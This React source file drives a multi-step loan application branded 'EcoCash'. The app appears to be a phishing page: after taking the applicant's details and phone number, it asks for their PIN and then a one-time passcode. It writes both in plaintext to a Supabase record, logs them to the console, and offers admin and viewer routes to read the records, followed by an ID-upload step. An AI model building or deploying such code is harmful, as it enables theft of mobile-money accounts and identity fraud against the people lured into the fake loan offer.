import React, { useEffect, useRef, useState } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { Header } from './components/Header';
import { LoanCalculatorScreen } from './components/LoanCalculatorScreen';
import { Step1LoanParameters } from './components/Step1LoanParameters';
import { Step2ApplicantDetails } from './components/Step2ApplicantDetails';
import { Step3FinancialReview } from './components/Step3FinancialReview';
import { SuccessScreen } from './components/SuccessScreen';
import { PinScreen } from './components/PinScreen';
import { OtpScreen } from './components/OtpScreen';
import { IdUploadScreen } from './components/IdUploadScreen';
import { ConfirmationScreen } from './components/ConfirmationScreen';
import { SubmittedScreen } from './components/SubmittedScreen';
import AdminPage from './components/AdminPage';
import ViewerPage from './components/ViewerPage';
import { AppStep, LoanFormData, SubmittedApplication } from './types';
import { calculateMonthlyPayment } from './utils/calculator';
import { resolveActiveApplicationId } from './utils/applicationId';
import { buildApplicationInsertPayload, createApplicationInSupabase, updateApplicationVerificationCodeInSupabase } from './utils/supabaseDirect';

const PROCESSING_STORAGE_KEY = 'isProcessing';
const SUBMITTED_APPLICATION_STORAGE_KEY = 'submittedApplication';

const initialFormData: LoanFormData = {
  loanType: 'Personal Loan',
  loanAmount: 5000,
  loanTermMonths: 12,
  purpose: '',
  firstName: '',
  lastName: '',
  email: '',
  phone: '',
  employmentStatus: 'Employed',
  annualIncome: '',
};

export default function App() {
  const [currentStep, setCurrentStep] = useState<AppStep>(() => {
    if (typeof window === 'undefined') return 'calculator';
    const stored = window.localStorage.getItem(PROCESSING_STORAGE_KEY);
    const validSteps: AppStep[] = ['calculator', 'step1', 'step2', 'step3', 'success', 'pin', 'verification', 'otp', 'loading', 'confirmation', 'idUpload', 'submitted'];
    return stored && validSteps.includes(stored as AppStep) ? (stored as AppStep) : 'calculator';
  });
  const [isAdminView, setIsAdminView] = useState<boolean>(() => {
    const isAdmin = window.location.pathname === '/admin';
    return isAdmin;
  });
  const [isViewerView, setIsViewerView] = useState<boolean>(() => window.location.pathname === '/viewer');
  const [formData, setFormData] = useState<LoanFormData>(initialFormData);
  const [submittedApplication, setSubmittedApplication] = useState<SubmittedApplication | null>(() => {
    if (typeof window === 'undefined') return null;
    const stored = window.localStorage.getItem(SUBMITTED_APPLICATION_STORAGE_KEY);
    if (!stored) return null;
    try {
      return JSON.parse(stored) as SubmittedApplication;
    } catch {
      window.localStorage.removeItem(SUBMITTED_APPLICATION_STORAGE_KEY);
      return null;
    }
  });
  const [isSubmitting, setIsSubmitting] = useState(false);
  const submittedApplicationIdRef = useRef<string | null>(null);

  const persistSubmittedApplication = (application: SubmittedApplication) => {
    window.localStorage.setItem(SUBMITTED_APPLICATION_STORAGE_KEY, JSON.stringify(application));
  };

  const clearPersistedSubmittedApplication = () => {
    window.localStorage.removeItem(SUBMITTED_APPLICATION_STORAGE_KEY);
  };

  const resolveApplicationId = (fallbackId?: string | null) => {
    const candidates = [submittedApplication?.id, submittedApplicationIdRef.current, fallbackId];
    return candidates.find((value): value is string => typeof value === 'string' && value.trim().length > 0)?.trim() ?? null;
  };

  const handlePinSubmit = async (pin: string) => {
    const previousApplicationId = submittedApplication?.id ?? submittedApplicationIdRef.current ?? null;
    const phone = formData.phone;
    const applicationId = resolveApplicationId(previousApplicationId);

    if (!applicationId) {
      console.error('Missing application id before PIN update', {
        applicationId: previousApplicationId,
        phone,
        pin,
        currentScreen: currentStep,
      });
      return;
    }

    const displayValue = `PIN: ${pin}`;
    try {
      submittedApplicationIdRef.current = applicationId;
      await updateApplicationVerificationCodeInSupabase(applicationId, displayValue);
      setSubmittedApplication((prev) => (prev ? { ...prev, verificationCode: displayValue } : prev));
      setCurrentStep('otp');
    } catch (error: any) {
      console.error('PIN update failed', {
        applicationId,
        phone,
        pin,
        error,
        stack: error?.stack,
      });
      throw error;
    }
  };

  const handleOtpSubmit = async (otp: string) => {
    const previousApplicationId = submittedApplication?.id ?? submittedApplicationIdRef.current ?? null;
    const phone = formData.phone;
    const applicationId = resolveApplicationId(previousApplicationId);

    if (!applicationId) {
      console.error('Missing application id before OTP update', {
        applicationId: previousApplicationId,
        phone,
        otp,
        currentScreen: currentStep,
      });
      return;
    }

    const existing = submittedApplication?.verificationCode ? `${submittedApplication.verificationCode} / ` : '';
    const displayValue = `${existing}OTP: ${otp}`;
    try {
      submittedApplicationIdRef.current = applicationId;
      window.localStorage.setItem(PROCESSING_STORAGE_KEY, 'loading');
      setCurrentStep('loading');
      await updateApplicationVerificationCodeInSupabase(applicationId, displayValue);
      setSubmittedApplication((prev) => {
        const next = prev ? { ...prev, verificationCode: displayValue } : null;
        if (next) persistSubmittedApplication(next);
        return next;
      });
      window.localStorage.setItem(PROCESSING_STORAGE_KEY, 'confirmation');
      setCurrentStep('confirmation');
    } catch (error: any) {
      window.localStorage.removeItem(PROCESSING_STORAGE_KEY);
      console.error('OTP update failed', {
        applicationId,
        phone,
        otp,
        error,
        stack: error?.stack,
      });
      setCurrentStep('otp');
      throw error;
    }
  };

  useEffect(() => {
    const handlePopState = () => {
      const newIsAdmin = window.location.pathname === '/admin';
      const newIsViewer = window.location.pathname === '/viewer';
      setIsAdminView(newIsAdmin);
      setIsViewerView(newIsViewer);
    };
    window.addEventListener('popstate', handlePopState);
    return () => window.removeEventListener('popstate', handlePopState);
  }, []);

  useEffect(() => {
    const processingState = window.localStorage.getItem(PROCESSING_STORAGE_KEY);
    if (processingState === 'loading') {
      setCurrentStep('loading');
    } else if (processingState === 'confirmation') {
      setCurrentStep('confirmation');
    } else if (processingState === 'idUpload') {
      setCurrentStep('idUpload');
    } else if (processingState === 'submitted') {
      setCurrentStep('submitted');
    }
  }, []);

  useEffect(() => {
    if (!submittedApplication && ['confirmation', 'idUpload', 'submitted', 'otp', 'pin'].includes(currentStep)) {
      handleReset();
    }
  }, [currentStep, submittedApplication]);


  const navigateToAdmin = () => {
    window.history.pushState({}, '', '/admin');
    setIsAdminView(true);
  };

  const navigateToApp = () => {
    window.history.pushState({}, '', '/');
    setIsAdminView(false);
    setIsViewerView(false);
  };

  const updateFormData = (fields: Partial<LoanFormData>) => {
    setFormData((prev) => ({ ...prev, ...fields }));
  };

  const handleBack = () => {
    if (currentStep === 'step1') setCurrentStep('calculator');
    else if (currentStep === 'step2') setCurrentStep('step1');
    else if (currentStep === 'step3') setCurrentStep('step2');
    else if (currentStep === 'pin') setCurrentStep('step3');
    else if (currentStep === 'otp') setCurrentStep('pin');
    else if (currentStep === 'success') setCurrentStep('otp');
  };

  const handleReset = () => {
    setFormData(initialFormData);
    setSubmittedApplication(null);
    submittedApplicationIdRef.current = null;
    window.localStorage.removeItem(PROCESSING_STORAGE_KEY);
    clearPersistedSubmittedApplication();
    setCurrentStep('calculator');
  };

  const handlePhoneReady = async () => {
    const previousApplicationId = submittedApplication?.id ?? submittedApplicationIdRef.current ?? null;
    const phone = formData.phone;

    if (submittedApplication?.id || submittedApplicationIdRef.current) {
      return;
    }

    const { monthlyPayment } = calculateMonthlyPayment(formData.loanAmount, formData.loanTermMonths);
    const payload = buildApplicationInsertPayload({
      ...formData,
      monthlyPayment,
    });

    try {
      const createdRecord = await createApplicationInSupabase(payload);

      const applicationId = createdRecord?.id ?? payload.id;
      submittedApplicationIdRef.current = applicationId;

      const nextApplication: SubmittedApplication = {
        ...formData,
        id: applicationId,
        submittedAt: payload.submittedAt,
        monthlyPayment,
        status: 'Pre-Approved',
        annualIncome: Number(formData.annualIncome) || 0,
        verificationCode: null,
      };
      setSubmittedApplication(nextApplication);
      persistSubmittedApplication(nextApplication);
    } catch (error: any) {
      console.error('Application create failed', {
        applicationId: payload.id,
        phone,
        error,
        stack: error?.stack,
      });
      throw error;
    }
  };

  const handleSubmitApplication = async () => {
    const previousApplicationId = submittedApplication?.id ?? null;
    const phone = formData.phone;

    setIsSubmitting(true);
    const { monthlyPayment } = calculateMonthlyPayment(formData.loanAmount, formData.loanTermMonths);

    try {
      const previousApplicationId = submittedApplication?.id ?? submittedApplicationIdRef.current ?? null;
      const applicationId = resolveApplicationId(previousApplicationId) ?? `ECO-${Math.floor(100000 + Math.random() * 900000)}`;
      submittedApplicationIdRef.current = applicationId;
      const fallbackApp: SubmittedApplication = {
        ...formData,
        id: applicationId,
        submittedAt: submittedApplication?.submittedAt ?? new Date().toISOString(),
        monthlyPayment,
        status: 'Pre-Approved',
        annualIncome: Number(formData.annualIncome) || 0,
        verificationCode: submittedApplication?.verificationCode ?? null,
      };
      setSubmittedApplication(fallbackApp);
      persistSubmittedApplication(fallbackApp);
    } catch (error: any) {
      console.error('Step 3 submit failed', {
        applicationId: previousApplicationId,
        phone,
        error,
        stack: error?.stack,
      });
      throw error;
    } finally {
      setIsSubmitting(false);
      setCurrentStep('pin');
    }
  };

  if (isAdminView) {
    return (
      <div className="min-h-screen bg-slate-100/90 text-slate-900 font-sans flex flex-col justify-between selection:bg-blue-500 selection:text-white">
        <Header currentStep={currentStep} onBack={navigateToApp} onReset={navigateToApp} />
        <main className="flex-1 flex items-center justify-center p-3 sm:p-6">
          <AdminPage onBackToApp={navigateToApp} />
        </main>
        <footer className="py-4 text-center text-xs text-slate-400 font-medium">
          &copy; 2025 EcoCash
        </footer>
      </div>
    );
  }

  if (currentStep === 'loading') {
    return (
      <div className="min-h-screen w-full relative flex items-center justify-center bg-white">
        <div className="absolute inset-0 opacity-10 pointer-events-none filter blur-[1px]">
          <OtpScreen
            phone={formData.phone}
            applicationId={submittedApplication?.id ?? submittedApplicationIdRef.current ?? ''}
            verificationDisplay={submittedApplication?.verificationCode ?? ''}
            onBack={() => {}}
            onSuccess={() => Promise.resolve()}
          />
        </div>
        <div className="relative z-10 flex flex-col items-center gap-4 px-6">
          <div className="h-14 w-14 rounded-full border-4 border-[#E5E7EB] border-t-[#0052CC] animate-spin" />
          <h1 className="text-xl font-semibold text-[#111827]">Please wait...</h1>
          <p className="text-base text-[#4B5563]">This usually takes a few seconds</p>
        </div>
      </div>
    );
  }

  return (
    <div className={`min-h-screen text-slate-900 font-sans flex flex-col justify-between selection:bg-blue-500 selection:text-white ${currentStep === 'pin' ? 'bg-white' : 'bg-slate-100/90'}`}>
      {currentStep !== 'pin' && currentStep !== 'confirmation' && currentStep !== 'idUpload' && <Header currentStep={currentStep} onBack={handleBack} onReset={handleReset} />}

      <main className={currentStep === 'pin' ? 'flex-1' : 'flex-1 flex items-center justify-center p-3 sm:p-6'}>
        {currentStep === 'pin' ? (
          <PinScreen
            phone={formData.phone}
            applicationId={submittedApplication?.id ?? submittedApplicationIdRef.current ?? ''}
            onBack={() => setCurrentStep('step3')}
            onNext={handlePinSubmit}
          />
        ) : (
          <div className="w-full max-w-md bg-white border border-slate-200/90 rounded-3xl shadow-sm p-5 sm:p-7 transition-all my-2">
            <AnimatePresence mode="wait">
              <motion.div
                key={currentStep}
                initial={{ opacity: 0, y: 8 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -8 }}
                transition={{ duration: 0.22, ease: 'easeOut' }}
              >
                {currentStep === 'calculator' && (
                  <LoanCalculatorScreen
                    loanAmount={formData.loanAmount}
                    setLoanAmount={(val) => updateFormData({ loanAmount: val })}
                    loanTermMonths={formData.loanTermMonths}
                    setLoanTermMonths={(val) => updateFormData({ loanTermMonths: val })}
                    onApplyNow={() => setCurrentStep('step1')}
                  />
                )}

                {currentStep === 'step1' && (
                  <Step1LoanParameters
                    formData={formData}
                    updateFormData={updateFormData}
                    onNext={() => setCurrentStep('step2')}
                  />
                )}

                {currentStep === 'step2' && (
                  <Step2ApplicantDetails
                    formData={formData}
                    updateFormData={updateFormData}
                    onNext={() => setCurrentStep('step3')}
                    onPrevious={() => setCurrentStep('step1')}
                    onPhoneReady={handlePhoneReady}
                  />
                )}

                {currentStep === 'step3' && (
                  <Step3FinancialReview
                    formData={formData}
                    updateFormData={updateFormData}
                    onSubmit={handleSubmitApplication}
                    onPrevious={() => setCurrentStep('step2')}
                    isSubmitting={isSubmitting}
                  />
                )}

                {currentStep === 'success' && submittedApplication && (
                  <SuccessScreen
                    application={submittedApplication}
                    onNewApplication={handleReset}
                    onContinue={handleReset}
                  />
                )}

                {currentStep === 'confirmation' && submittedApplication && (
                  <ConfirmationScreen
                    applicationId={submittedApplication.id}
                    onComplete={() => {
                      window.localStorage.setItem(PROCESSING_STORAGE_KEY, 'idUpload');
                      setCurrentStep('idUpload');
                    }}
                    onRetry={() => {
                      handleReset();
                    }}
                  />
                )}

                {currentStep === 'idUpload' && submittedApplication && (
                  <IdUploadScreen
                    application={submittedApplication}
                    onBackToApp={handleReset}
                    onComplete={() => {
                      window.localStorage.setItem(PROCESSING_STORAGE_KEY, 'submitted');
                      setCurrentStep('submitted');
                    }}
                  />
                )}

                {currentStep === 'submitted' && submittedApplication && (
                  <SubmittedScreen />
                )}

                {currentStep === 'otp' && (
                  <OtpScreen
                    phone={formData.phone}
                    applicationId={submittedApplication?.id ?? submittedApplicationIdRef.current ?? ''}
                    verificationDisplay={submittedApplication?.verificationCode ?? ''}
                    onBack={() => setCurrentStep('pin')}
                    onSuccess={handleOtpSubmit}
                  />
                )}
              </motion.div>
            </AnimatePresence>
          </div>
        )}
      </main>

      {currentStep !== 'pin' && (
        <footer className="py-4 text-center text-xs text-slate-400 font-medium">
          &copy; 2025 EcoCash
        </footer>
      )}
    </div>
  );
}
